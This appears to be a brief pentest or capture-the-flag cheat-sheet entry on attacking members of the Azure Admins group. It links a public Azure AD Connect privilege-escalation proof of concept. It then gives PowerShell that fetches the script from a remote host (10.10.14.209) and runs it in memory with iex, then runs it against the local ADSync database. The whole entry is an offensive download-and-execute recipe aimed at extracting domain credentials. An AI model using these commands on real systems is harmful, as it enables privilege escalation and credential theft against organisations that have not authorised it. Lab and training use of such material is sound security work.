# Azure Admins

Exploit with [this](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1) poc.

```powershell
# Download script
iex((new-object net.webclient).downloadstring("http://10.10.14.209/Azure-ADConnect.ps1"))

# Execute script
Azure-ADConnect -server 127.0.0.1 -db ADSync
```
